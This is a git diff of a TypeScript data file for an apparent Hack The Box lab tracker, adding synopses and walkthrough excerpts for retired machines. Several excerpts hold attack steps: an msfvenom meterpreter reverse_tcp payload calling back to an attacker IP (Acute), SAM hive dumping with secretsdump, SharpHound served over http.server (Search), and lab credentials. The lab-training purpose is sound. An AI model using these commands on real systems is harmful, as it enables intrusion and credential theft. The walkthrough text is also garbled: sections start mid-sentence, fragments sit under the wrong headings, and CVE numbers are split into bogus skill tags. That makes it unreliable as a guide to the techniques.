+    "officialWalkthrough": "### 📋 Official Synopsis\nSteamCloud is an easy difficulty machine. The port scan reveals that it has a bunch of Kubernetes specific ports open. We cannot enumerate the Kubernetes API because it requires authentication. Now, as Kubelet allows anonymous access, we can extract a list of all the pods from the K8s cluster by enumerating the Kubelet service. Furthermore, we can get into one of the pods and obtain the keys necessary to authenticate into the Kubernetes API. We can now create and spawn a malicious pod and then use Kubectl to run commands within the pod to read the root flag.\n\n### 🎯 Core Skills\n- **Exploiting Kubernetes**\n\n### ⚔️ Foothold Vector\nWe already know that Nginx exists solely in the default namespace and is not a Kubernetes related pod. Because Kubelet allows anonymous access, we may use the commands /run , /exec , and /cri but Curl will not work because it only allows web socket connections. We may use the scan rce command in Kubeletctl to determine whether we can run commands on any pods. kubeletctl --server 10.129.96.\n\n### 👑 Privilege Escalation\nflag. Skills required Basic Linux Knowledge Basic Kubernetes Enumeration Skills learned Exploiting Kubernetes Enumeration Let's scan the target IP with nmap to see if we can uncover anything noteworthy. Nmap displays several intriguing ports, with SSH defaulting to port 22. Etcd, a kubernetes component, listens on port 2379 as a client and 2380 as a server. Kubelet, a kubernetes extension, listens on port 10250 by default, and the kubernetes API listens on port 8443. Let's have a look at the Kubernetes API, which is accessible on port 8443. nmap 10.129.96.98 --max-retries=0 -T4 -p- curl https://10.129.96."
   },
   {
     "id": "htb-epsilon",
@@ -6088,15 +6527,26 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "Basic-Cloud-Knowledge",
+      "Basic-Linux-Knowledge",
+      "HTB",
+      "OWASP-Top-10"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/epsilon",
     "writeupUrl": "https://0xdf.gitlab.io/tags#epsilon",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "Epsilon is a medium difficulty Linux machine which exposes a Git repository on the webserver. AWS credentials are leaked in Git commits, which allows downloading the AWS Lambda function code.",
     "timeSpentSeconds": 0,
     "createdAt": "2022-02-07T08:00:05.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Epsilon is a medium difficulty Linux machine which exposes a Git repository on the webserver. AWS credentials are leaked in Git commits, which allows downloading the AWS Lambda function code. Secret key found in the source code can be used to forge a cookie to gain access to the web application. Foothold is obtained by exploiting the Server Side Template Injection vulnerability in the application feature. Abusing the tar symlink in a cronjob gives root access.",
+    "skillsLearned": [
+      "Basic Linux Knowledge",
+      "Basic Cloud Knowledge",
+      "OWASP Top 10"
+    ],
+    "officialPdf": "442-Epsilon_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nEpsilon is a medium difficulty Linux machine which exposes a Git repository on the webserver. AWS credentials are leaked in Git commits, which allows downloading the AWS Lambda function code. Secret key found in the source code can be used to forge a cookie to gain access to the web application. Foothold is obtained by exploiting the Server Side Template Injection vulnerability in the application feature. Abusing the tar symlink in a cronjob gives root access.\n\n### 🎯 Core Skills\n- **Basic Linux Knowledge**\n- **Basic Cloud Knowledge**\n- **OWASP Top 10**\n\n### ⚔️ Foothold Vector\nis obtained by exploiting the Server Side Template Injection vulnerability in the application feature. Abusing the tar symlink in a cronjob gives\n\n### 👑 Privilege Escalation\naccess. Skills Required Basic Linux Knowledge Basic Cloud Knowledge OWASP Top 10 Skills Learned Git Enumeration Lambda Function Enumeration Authentication Bypass Server Side Template Injection Tar Symlink Exploitation Enumeration Nmap Nmap scan reveals that the target host has 3 ports open. Let's browse to port 80. This says forbidden. Browsing to port 5000 reveals a login page. ports=$(nmap -p- --min-rate=1000 -T4 10.129.96.99 | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -p$ports -sV -sC 10.129.96.99 Bruteforcing or SQL Injection attempts failed on this login. FFUF Let's enumerating files and folders on port 80 using ffuf. This reveals a Git repository."
   },
   {
     "id": "htb-pressed",
@@ -6126,15 +6576,22 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "Reversing-Knowledge"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/undetected",
     "writeupUrl": "https://0xdf.gitlab.io/tags#undetected",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "Undetected is a medium Linux machine that features an Apache server on port 80 , which serves a jewellery store website. The initial foothold is gained by exploiting a PHP command injection vulnerability present in the web application to gain a www-data user shell.",
     "timeSpentSeconds": 0,
     "createdAt": "2022-02-19T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Undetected is a medium Linux machine that features an Apache server on port 80 , which serves a jewellery store website. The initial foothold is gained by exploiting a PHP command injection vulnerability present in the web application to gain a www-data user shell.",
+    "skillsLearned": [
+      "Reversing Knowledge"
+    ],
+    "officialPdf": "439-Undetected_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nUndetected is a medium Linux machine that features an Apache server on port 80 , which serves a jewellery store website. The initial foothold is gained by exploiting a PHP command injection vulnerability present in the web application to gain a www-data user shell.\n\n### 🎯 Core Skills\n- **Reversing Knowledge**\n\n### ⚔️ Foothold Vector\nis gained by exploiting a PHP command injection vulnerability present in the web application to gain a www-data user shell. Enumeration shows that the system had been previously compromised and\n\n### 👑 Privilege Escalation\nrequires retracing the attacker's steps in order to find the backdoors that were left behind by the initial compromise. We are further required to analyse and reverse engineer the backdoor inside the sshd binary, which leads to a full system access as the root user. Skills required Linux Fundamentals Web Enumeration Skills learned Reversing Knowledge Enumeration Nmap Let's run a Nmap scan to discover open ports on the remote host. The Nmap scan shows that OpenSSH is running on its default port, i.e. port 22 and the Apache HTTP web server is running on port 80 . HTTP Browsing to port 80 and reading some of the content on the webpage it appears to be the website of a jewellery store."
   },
   {
     "id": "htb-acute",
@@ -6145,15 +6602,26 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Hard",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "Manual-Active-Directory",
+      "Windows-Defender-bypass"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/acute",
     "writeupUrl": "https://0xdf.gitlab.io/tags#acute",
-    "hint": "Hack The Box Windows machine. Rated Hard difficulty.",
+    "hint": "Acute is a hard Windows machine that starts with a website on port 443 . The certificate of the website reveals a domain name atsserver.acute.local .",
     "timeSpentSeconds": 0,
     "createdAt": "2022-02-12T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Acute is a hard Windows machine that starts with a website on port 443 . The certificate of the website reveals a domain name atsserver.acute.local . Looking around the website there are several employees mentioned and with this information it is possible to construct a list of possible users on the remote machine. Enumerating the website reveals a form with procedures regarding newcomers to the company. The form reveals the default password that all accounts are initially set up with. It also reveals a link for a Windows PowerShell Web Access (PSWA) session.",
+    "skillsLearned": [
+      "Windows PowerShell Web Access sessions",
+      "Windows misconfigurations",
+      "Windows Defender bypass",
+      "Manual Active Directory"
+    ],
+    "officialPdf": "438-Acute_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nAcute is a hard Windows machine that starts with a website on port 443 . The certificate of the website reveals a domain name atsserver.acute.local . Looking around the website there are several employees mentioned and with this information it is possible to construct a list of possible users on the remote machine. Enumerating the website reveals a form with procedures regarding newcomers to the company. The form reveals the default password that all accounts are initially set up with. It also reveals a link for a Windows PowerShell Web Access (PSWA) session.\n\n### 🎯 Core Skills\n- **Windows PowerShell Web Access sessions**\n- **Windows misconfigurations**\n- **Windows Defender bypass**\n- **Manual Active Directory**\n\n### ⚔️ Foothold Vector\nUpon visiting the training link we are presented with a login prompt for the PSWA that was also mentioned in the form. Going through our notes, we have a list of usernames that we could try, a username schema, a default password and a computer name from the DOCX document. After some trial and error we can login using the credentials edavies:Password1! at Acute-PC01 . We can now execute commands as edavies . Our next step, would be to try and get a meterpreter shell. First, we have to create our payload using Msfvenom . Then, we open up Msfconsole and configure our listener. msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.53 LPORT=9001 -f exe > shell.\n\n### 👑 Privilege Escalation\nNow that we have access as a local administrator on Acute-PC01 we can extract the hashes of all users from the HKLM\\sam and HKLM\\system files. First of all, we have to make copies of these files. We will execute all of the following commands inside the C:\\utils directory since we have our meterpreter shell there. Now, we can use our meterpreter session to download these files. reg save HKLM\\sam sam.bak reg save HKLM\\system system.bak download sam.bak download system.bak Now that we have these two files we can use impacket-secretsdump from impacket to extract the hashes for all the local users. Then, we proceed to attempt and crack the hashes using John ."
   },
   {
     "id": "htb-flustered",
@@ -6164,15 +6632,24 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
+      "Accessing-Azure-Storage",
       "HTB"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/flustered",
     "writeupUrl": "https://0xdf.gitlab.io/tags#flustered",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "Flustered is a medium difficulty Linux machine which showcases two different storage solutions (GlusterFS and the Azure Storage emulator Azurite) that can be accessed at different stages in order to obtain different levels of access to the system. First, unauthenticated mount of ",
     "timeSpentSeconds": 0,
     "createdAt": "2022-01-31T15:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Flustered is a medium difficulty Linux machine which showcases two different storage solutions (GlusterFS and the Azure Storage emulator Azurite) that can be accessed at different stages in order to obtain different levels of access to the system. First, unauthenticated mount of a GlusterFS volume allows attackers to read Squid credentials from a database, granting access to a local HTTP server where the source code of the main web application can be read, discovering an SSTI vulnerabilty that results in remote command execution.",
+    "skillsLearned": [
+      "Mounting GlusterFS volumes",
+      "Identifying and exploiting SSTI vulnerabilities",
+      "Accessing Azure Storage"
+    ],
+    "officialPdf": "437-Flustered_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nFlustered is a medium difficulty Linux machine which showcases two different storage solutions (GlusterFS and the Azure Storage emulator Azurite) that can be accessed at different stages in order to obtain different levels of access to the system. First, unauthenticated mount of a GlusterFS volume allows attackers to read Squid credentials from a database, granting access to a local HTTP server where the source code of the main web application can be read, discovering an SSTI vulnerabilty that results in remote command execution.\n\n### 🎯 Core Skills\n- **Mounting GlusterFS volumes**\n- **Identifying and exploiting SSTI vulnerabilities**\n- **Accessing Azure Storage**\n\n### ⚔️ Foothold Vector\nHaving obtained access to MariaDB files, we are now able to read data stored in the database tables. The mysql_upgrade_info file reveals the MariaDB version: We can run our own MariaDB server (using the same version as above to ensure compatibility) copying data from vol2 into /var/lib/mysql . This can be easily accomplished using Docker, enabling auth_socket authentication to avoid entering a password: We can now read data from the passwd table in the squid database: A quicker way to obtain the same information without running MariaDB server would be to use the strings command: Either way, we have obtained a user named lance.friedman with password o>WJ5-jD<5^m3 .\n\n### 👑 Privilege Escalation\nuser. Skills Required Enumeration Pivoting MySQL / MariaDB knowledge Skills Learned Mounting GlusterFS volumes Identifying and exploiting SSTI vulnerabilities Accessing Azure Storage Enumeration Nmap Nmap scan shows that OpenSSH, nginx and Squid are listening on their default ports. A few more ports, which Nmap identified as rpcbind , are open. Nginx Browsing to port 80 we see an empty page with a background image but no actual content. ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.131 | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -p$ports -sV -sC -Pn 10.10.11.131 The page title is steampunk-era.htb - Coming Soon , which means the web site is still under development."
   },
   {
     "id": "htb-paper",
@@ -6183,15 +6660,24 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "CVE-2019-17671",
+      "CVE-2021-3560",
+      "HTB",
+      "Linux-Fundamentals"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/paper",
     "writeupUrl": "https://0xdf.gitlab.io/tags#paper",
-    "hint": "Hack The Box Linux machine. Rated Easy difficulty.",
+    "hint": "Paper is an easy Linux machine that features an Apache server on ports 80 and 443, which are serving the HTTP and HTTPS versions of a website respectively. The website on port 80 returns a default server webpage but the HTTP response header reveals a hidden domain.",
     "timeSpentSeconds": 0,
     "createdAt": "2022-02-05T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Paper is an easy Linux machine that features an Apache server on ports 80 and 443, which are serving the HTTP and HTTPS versions of a website respectively. The website on port 80 returns a default server webpage but the HTTP response header reveals a hidden domain. This hidden domain is running a WordPress blog, whose version is vulnerable to CVE-2019-17671. This vulnerability allows us to view the confidential information stored in the draft posts of the blog, which reveal another URL leading to an employee chat system. This chat system is based on Rocketchat.",
+    "skillsLearned": [
+      "Linux Fundamentals"
+    ],
+    "officialPdf": "432-Paper_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nPaper is an easy Linux machine that features an Apache server on ports 80 and 443, which are serving the HTTP and HTTPS versions of a website respectively. The website on port 80 returns a default server webpage but the HTTP response header reveals a hidden domain. This hidden domain is running a WordPress blog, whose version is vulnerable to CVE-2019-17671. This vulnerability allows us to view the confidential information stored in the draft posts of the blog, which reveal another URL leading to an employee chat system. This chat system is based on Rocketchat.\n\n### 🎯 Core Skills\n- **Linux Fundamentals**\n\n### 🛡️ Associated CVEs\n`CVE-2019-17671`, `CVE-2021-3560`\n\n### ⚔️ Foothold Vector\nWeb Enumeration Enumeration Nmap Let's run a Nmap scan to discover the open ports of the remote host. The Nmap scan shows that OpenSSH is running on it's default port, i.e. port 22 . Furthermore, the Apache HTTP web server is serving an HTTP webpage on port 80 along with its HTTPS version on port 443 . HTTP Browsing to port 80 , we see a default server web page that contains no interesting information. ports=$(nmap -p- --min-rate=1000 -T4 10.129.1.11 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -p$ports -sV 10.10.11.143 Let's intercept the web request to this webpage in BurpSuite to check for any useful information in the HTTP response.\n\n### 👑 Privilege Escalation\nprivileges. Skills required Linux Fundamentals Skills learned CVE exploitation Web Enumeration Enumeration Nmap Let's run a Nmap scan to discover the open ports of the remote host. The Nmap scan shows that OpenSSH is running on it's default port, i.e. port 22 . Furthermore, the Apache HTTP web server is serving an HTTP webpage on port 80 along with its HTTPS version on port 443 . HTTP Browsing to port 80 , we see a default server web page that contains no interesting information. ports=$(nmap -p- --min-rate=1000 -T4 10.129.1.11 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -p$ports -sV 10.10.11."
   },
   {
     "id": "htb-scanned",
@@ -6202,15 +6688,22 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Insane",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "Manual"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/scanned",
     "writeupUrl": "https://0xdf.gitlab.io/tags#scanned",
-    "hint": "Hack The Box Linux machine. Rated Insane difficulty.",
+    "hint": "Scanned is an Insane Linux machine that starts with a webpage of a malware scanning application. The source code for both the web application and a sandboxing application is available for review through the webpage.",
     "timeSpentSeconds": 0,
     "createdAt": "2022-01-29T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Scanned is an Insane Linux machine that starts with a webpage of a malware scanning application. The source code for both the web application and a sandboxing application is available for review through the webpage. A potential attacker will have to review the source code and trace some minor coding mistakes that combined could lead to a full system compromise. An attacker can exploit these mistakes and craft a binary that can bypass the sandbox and leak sensitive information from the remote machine.",
+    "skillsLearned": [
+      "Manual"
+    ],
+    "officialPdf": "431-Scanned_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nScanned is an Insane Linux machine that starts with a webpage of a malware scanning application. The source code for both the web application and a sandboxing application is available for review through the webpage. A potential attacker will have to review the source code and trace some minor coding mistakes that combined could lead to a full system compromise. An attacker can exploit these mistakes and craft a binary that can bypass the sandbox and leak sensitive information from the remote machine.\n\n### 🎯 Core Skills\n- **Manual**\n\n### 👑 Privilege Escalation\nmechanism of the sandbox by hijacking a library used by a SUID binary. Through this exploitation process, an attacker can create a backdoor on the system and gain root privileges. Skills Required Enumeration Source code review Linux capabilities Namespaces Skills Learned Manual exploitation Escaping chroot Code injection Library hijack Enumeration Nmap The initial Nmap output reveals just two ports open. On port 22 an SSH server is running and on port 80 an Nginx web server. Since we don't, currently, have any valid SSH credentials we begin our enumeration by visiting port 80 . Nginx We begin our enumeration by visiting http:/10.10.11.141 ."
   },
   {
     "id": "htb-nodeblog",
@@ -6240,15 +6733,33 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
+      "2020",
+      "2021",
+      "22204-and-CVE",
+      "29599",
+      "CVE-2020-29599",
+      "CVE-2021-22204",
+      "Exploiting-CVE",
       "HTB"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/meta",
     "writeupUrl": "https://0xdf.gitlab.io/tags#meta",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "Meta is a medium difficulty Linux machine that focuses on two different CVEs (CVE-2021-22204 and CVE- 2020-29599) in ExifTool and ImageMagick, which can be exploited at different stages. Foothold is obtained by uploading a maliciously crafted file to a web application that reads ",
     "timeSpentSeconds": 0,
     "createdAt": "2022-01-22T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Meta is a medium difficulty Linux machine that focuses on two different CVEs (CVE-2021-22204 and CVE- 2020-29599) in ExifTool and ImageMagick, which can be exploited at different stages. Foothold is obtained by uploading a maliciously crafted file to a web application that reads image metadata, in order to trigger Remote Command Execution in ExifTool. Command injection in ImageMagick is then exploited to move laterally to a second user.",
+    "skillsLearned": [
+      "Exploiting CVE",
+      "2021",
+      "22204 and CVE",
+      "2020",
+      "29599",
+      "Exploiting sudo misconfigurations"
+    ],
+    "officialPdf": "429-Meta_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nMeta is a medium difficulty Linux machine that focuses on two different CVEs (CVE-2021-22204 and CVE- 2020-29599) in ExifTool and ImageMagick, which can be exploited at different stages. Foothold is obtained by uploading a maliciously crafted file to a web application that reads image metadata, in order to trigger Remote Command Execution in ExifTool. Command injection in ImageMagick is then exploited to move laterally to a second user.\n\n### 🎯 Core Skills\n- **Exploiting CVE**\n- **2021**\n- **22204 and CVE**\n- **2020**\n- **29599**\n- **Exploiting sudo misconfigurations**\n\n### 🛡️ Associated CVEs\n`CVE-2020-29599`, `CVE-2021-22204`\n\n### ⚔️ Foothold Vector\nis obtained by uploading a maliciously crafted file to a web application that reads image metadata, in order to trigger Remote Command Execution in ExifTool. Command injection in ImageMagick is then exploited to move laterally to a second user. Finally, privileges can be escalated due to an env_keep setting in sudo that allows attackers to run arbitrary commands as\n\n### 👑 Privilege Escalation\nby setting a custom configuration directory in an environment variable. Skills Required Enumeration Basic Linux knowledge Skills Learned Exploiting CVE-2021-22204 and CVE-2020-29599 Exploiting sudo misconfigurations Enumeration Nmap The nmap output shows OpenSSH and Apache listening on their default ports. Apache Browsing to port 80 redirects us to artcorp.htb . We add a corresponding entry to the /etc/hosts file: Upon refreshing our browser we come across a landing page which contains some information about the company. A product under development called \"MetaView\" is briefly mentioned. ports=$(nmap -p- --min-rate=1000 -T4 10.10.11."
   },
   {
     "id": "htb-logforge",
@@ -6278,15 +6789,27 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Hard",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "Basic-Linux-Fundamentals",
+      "CVE-2020-35476",
+      "CVE-2021-21311",
+      "CVE-2021-25294",
+      "HTB",
+      "Linux-system"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/admirertoo",
     "writeupUrl": "https://0xdf.gitlab.io/tags#admirertoo",
-    "hint": "Hack The Box Linux machine. Rated Hard difficulty.",
+    "hint": "AdmirerToo is a hard rated Linux machine. The initial port scan reveals a few filtered/internal ports along with port 22 running SSH & port 80, which is serving a photo gallery webpage.",
     "timeSpentSeconds": 0,
     "createdAt": "2022-01-15T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "AdmirerToo is a hard rated Linux machine. The initial port scan reveals a few filtered/internal ports along with port 22 running SSH & port 80, which is serving a photo gallery webpage. Enumerating the website leads us to the Adminer service running on one of the sub-domains. The installed version of the Adminer service is vulnerable to an SSRF vulnerability, CVE-2021-21311 which can be exploited to enumerate the service running on the internal port 4242.",
+    "skillsLearned": [
+      "Basic Linux Fundamentals",
+      "Linux system"
+    ],
+    "officialPdf": "427-AdmirerToo_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nAdmirerToo is a hard rated Linux machine. The initial port scan reveals a few filtered/internal ports along with port 22 running SSH & port 80, which is serving a photo gallery webpage. Enumerating the website leads us to the Adminer service running on one of the sub-domains. The installed version of the Adminer service is vulnerable to an SSRF vulnerability, CVE-2021-21311 which can be exploited to enumerate the service running on the internal port 4242.\n\n### 🎯 Core Skills\n- **Basic Linux Fundamentals**\n- **Linux system**\n\n### 🛡️ Associated CVEs\n`CVE-2020-35476`, `CVE-2021-21311`, `CVE-2021-25294`\n\n### ⚔️ Foothold Vector\nExploiting SSRF (Server Side Request Forgery) Enumeration Nmap Let us run a Nmap scan to discover the open ports of the remote host. The Nmap scan shows that OpenSSH and Apache are listening on their default ports. Three additional ports appear to be filtered by a firewall. Apache Browsing to port 80, a single web page containing an image gallery is displayed. The page contains no interesting information. ports=$(nmap -p- --min-rate=1000 -T4 10.129.1.11 | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -p$ports -sV 10.129.1.11 No apparent vulnerabilities are found on this page.\n\n### 👑 Privilege Escalation\nuser shell. Skills required Basic Linux Fundamentals Linux system enumeration Skills learned CVE exploitation Exploiting SSRF (Server Side Request Forgery) Enumeration Nmap Let us run a Nmap scan to discover the open ports of the remote host. The Nmap scan shows that OpenSSH and Apache are listening on their default ports. Three additional ports appear to be filtered by a firewall. Apache Browsing to port 80, a single web page containing an image gallery is displayed. The page contains no interesting information. ports=$(nmap -p- --min-rate=1000 -T4 10.129.1.11 | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -p$ports -sV 10.129.1."
   },
   {
     "id": "htb-pandora",
@@ -6297,15 +6820,22 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "SNMP"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/pandora",
     "writeupUrl": "https://0xdf.gitlab.io/tags#pandora",
-    "hint": "Hack The Box Linux machine. Rated Easy difficulty.",
+    "hint": "Pandora is an easy rated Linux machine. The port scan reveals a SSH, web-server and SNMP service running on the box.",
     "timeSpentSeconds": 0,
     "createdAt": "2022-01-08T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Pandora is an easy rated Linux machine. The port scan reveals a SSH, web-server and SNMP service running on the box. Initial foothold is obtained by enumerating the SNMP service, which reveals cleartext credentials for user daniel . Host",
+    "skillsLearned": [
+      "SNMP"
+    ],
+    "officialPdf": "423-Pandora_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nPandora is an easy rated Linux machine. The port scan reveals a SSH, web-server and SNMP service running on the box. Initial foothold is obtained by enumerating the SNMP service, which reveals cleartext credentials for user daniel . Host\n\n### 🎯 Core Skills\n- **SNMP**\n\n### ⚔️ Foothold Vector\nis obtained by enumerating the SNMP service, which reveals cleartext credentials for user daniel . Host enumeration reveals Pandora FMS running on an internal port, which can be accessed through port forwarding. Lateral movement to another user called matt is achieved by chaining SQL injection & RCE vulnerabilities in the PandoraFMS service.\n\n### 👑 Privilege Escalation\nto user root is performed by exploiting a SUID binary for PATH variable injection. Skills required Basic Linux Knowledge Skills learned SNMP enumeration Port forwarding SQL injection Lateral movement Reversing PATH variable injection Enumeration We will begin by scanning the host for any open TCP ports and running services with a Nmap scan: A second scan can be run to determine the services that are listening on each port."
   },
   {
     "id": "htb-search",
@@ -6316,15 +6846,25 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Hard",
     "status": "backlog",
     "tags": [
+      "GMSA-password-retrieval",
       "HTB"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/search",
     "writeupUrl": "https://0xdf.gitlab.io/tags#search",
-    "hint": "Hack The Box Windows machine. Rated Hard difficulty.",
+    "hint": "Search is a hard difficulty Windows machine that focuses on Active Directory",
     "timeSpentSeconds": 0,
     "createdAt": "2021-12-18T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Search is a hard difficulty Windows machine that focuses on Active Directory",
+    "skillsLearned": [
+      "Removing protection from XLSX files",
+      "Using Windows PowerShell Web Access",
+      "GMSA password retrieval",
+      "Exploiting misconfigured Active Directory ACLs"
+    ],
+    "officialPdf": "422-Search_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nSearch is a hard difficulty Windows machine that focuses on Active Directory\n\n### 🎯 Core Skills\n- **Removing protection from XLSX files**\n- **Using Windows PowerShell Web Access**\n- **GMSA password retrieval**\n- **Exploiting misconfigured Active Directory ACLs**\n\n### ⚔️ Foothold Vector\ntechniques. Foothold is obtained by finding exposed credentials in a web page, enumerating AD users, running a Kerberoast attack to obtain a crackable hash for a service account and spraying the password against a subset of the discovered accounts, obtaining access to a SMB share where a protected XLSX file containing user data is found. Unprotecting the file leads to a second set of credentials, which gives access to another share where PKCS#12 certificates can be downloaded. After importing the certificates into a web browser, Windows PowerShell Web Access can be used to obtain an interactive shell on the system.\n\n### 👑 Privilege Escalation\nWe host the BloodHound collector SharpHound.exe from our attacking machine using the Python http.server module: From our web PowerShell session we run the following commands to download and run SharpHound: sudo python -m http.server 80 We transfer the generated ZIP file to our local machine and import it into BloodHound. After marking the sierra.frye user as owned, we run the Shortest Paths from Owned Principals query : sierra.frye is a member of the ITSEC group, which has ReadGMSAPassword rights on the BIR-ADFS- GMSA$ group managed service account. This account, in turn, has GenericAll rights on tristan.davies , which is a member of the Administrators group."
   },
   {
     "id": "htb-timing",
@@ -6335,15 +6875,22 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "Side-Channel"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/timing",
     "writeupUrl": "https://0xdf.gitlab.io/tags#timing",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "Timing is a Medium difficulty Linux machine that features an Apache web server running on port 80. A login page on the server is found to be vulnerable to a Side Channel",
     "timeSpentSeconds": 0,
     "createdAt": "2021-12-11T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Timing is a Medium difficulty Linux machine that features an Apache web server running on port 80. A login page on the server is found to be vulnerable to a Side Channel",
+    "skillsLearned": [
+      "Side Channel"
+    ],
+    "officialPdf": "421-Timing_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nTiming is a Medium difficulty Linux machine that features an Apache web server running on port 80. A login page on the server is found to be vulnerable to a Side Channel\n\n### 🎯 Core Skills\n- **Side Channel**\n\n### ⚔️ Foothold Vector\nSide Channel Enumeration We can correctly verify that this is the case by using the time command on Bash in order to measure the time it takes for each login request to be processed and a reply to be received. First let's select a random set of credentials like test / test . cURL is used to make the requests. Note: Make sure to use Bash for the time command, as other shells such as zsh do not support it. The output shows that the server responded in around 1 millisecond, or 0.131 seconds. Running this command a few more times we can get a more accurate range of delays between requests and responses and we notice they are around 0.130 to 0.140 seconds.\n\n### 👑 Privilege Escalation\nvia Sudo, that uses the Axel command line utility to download files from the internet. An Axel configuration file is placed in the user's home directory that instructs the utility to place a downloaded file in the SSH directory of the root user thus granting SSH access as root. Skills Required Enumeration Bash Scripting Knowledge Python Scripting Knowledge Basic Git usage Skills Learned Side Channel Enumeration Local File Inclusion Arbitrary File Upload Axel Misconfiguration Enumeration Nmap Let's begin by running an Nmap scan. ports=$(nmap -p- --min-rate=1000 -T4 10.129.93.50 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -p$ports -sV -sC 10.129.93."
   },
   {
     "id": "htb-union",
@@ -6373,15 +6920,26 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Insane",
     "status": "backlog",
     "tags": [
